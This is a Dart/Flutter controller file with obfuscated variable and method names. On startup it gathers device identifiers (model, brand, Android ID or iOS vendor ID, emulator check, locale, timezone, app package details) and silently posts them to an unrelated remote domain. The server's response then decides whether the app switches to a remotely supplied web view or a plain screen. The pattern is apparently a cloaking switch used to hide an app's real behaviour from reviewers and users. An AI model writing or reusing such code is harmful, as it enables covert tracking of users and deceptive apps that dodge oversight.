import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var jcqyuonh = RxBool(false);
  var ltejnpfogy = RxBool(true);
  var dqzbpyci = RxString("");
  var jessie = RxBool(false);
  var hessel = RxBool(true);
  final cstmegihr = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ibvoayn();
  }


  Future<void> ibvoayn() async {

    jessie.value = true;
    hessel.value = true;
    ltejnpfogy.value = false;

    cstmegihr.post("https://vvar-i.bbflower.online/envwrzmpoukhiafxjlqbscg",data: await wvhcltfia()).then((value) {
      var yizr = value.data["yizr"] as String;
      var itrmce = value.data["itrmce"] as bool;
      if (itrmce) {
        dqzbpyci.value = yizr;
        mercedes();
      } else {
        beer();
      }
    }).catchError((e) {
      ltejnpfogy.value = true;
      hessel.value = true;
      jessie.value = false;
    });
  }

  Future<Map<String, dynamic>> wvhcltfia() async {
    final DeviceInfoPlugin gqnzr = DeviceInfoPlugin();
    PackageInfo fqdnbr_ihgwlmx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var srvy = Platform.localeName;
    var zgsic_GMh = currentTimeZone;

    var zgsic_ghoAu = fqdnbr_ihgwlmx.packageName;
    var zgsic_yJIej = fqdnbr_ihgwlmx.version;
    var zgsic_KXrCsfkj = fqdnbr_ihgwlmx.buildNumber;

    var zgsic_JXK = fqdnbr_ihgwlmx.appName;
    var zgsic_lXQxzLH = "";
    var loyalAdams = "";
    var nicoletteWaters = "";
    var zgsic_TCk  = "";
    var omaSchinner = "";
    var lylaSteuber = "";
    var zgsic_NW = "";


    var zgsic_novPbGV = "";
    var zgsic_dF = false;

    if (GetPlatform.isAndroid) {
      zgsic_novPbGV = "android";
      var ncltgpjy = await gqnzr.androidInfo;

      zgsic_NW = ncltgpjy.brand;

      zgsic_lXQxzLH  = ncltgpjy.model;
      zgsic_TCk = ncltgpjy.id;

      zgsic_dF = ncltgpjy.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zgsic_novPbGV = "ios";
      var ycwzanogmp = await gqnzr.iosInfo;
      zgsic_NW = ycwzanogmp.name;
      zgsic_lXQxzLH = ycwzanogmp.model;

      zgsic_TCk = ycwzanogmp.identifierForVendor ?? "";
      zgsic_dF  = ycwzanogmp.isPhysicalDevice;
    }
    var res = {
      "loyalAdams" : loyalAdams,
      "zgsic_JXK": zgsic_JXK,
      "zgsic_KXrCsfkj": zgsic_KXrCsfkj,
      "zgsic_ghoAu": zgsic_ghoAu,
      "zgsic_lXQxzLH": zgsic_lXQxzLH,
      "zgsic_GMh": zgsic_GMh,
      "nicoletteWaters" : nicoletteWaters,
      "zgsic_NW": zgsic_NW,
      "zgsic_TCk": zgsic_TCk,
      "srvy": srvy,
      "zgsic_novPbGV": zgsic_novPbGV,
      "zgsic_yJIej": zgsic_yJIej,
      "zgsic_dF": zgsic_dF,
      "omaSchinner" : omaSchinner,
      "lylaSteuber" : lylaSteuber,

    };
    return res;
  }

  Future<void> beer() async {
    Get.offAllNamed("/bird_tab");
  }

  Future<void> mercedes() async {
    Get.offAllNamed("/bird_tool");
  }
}
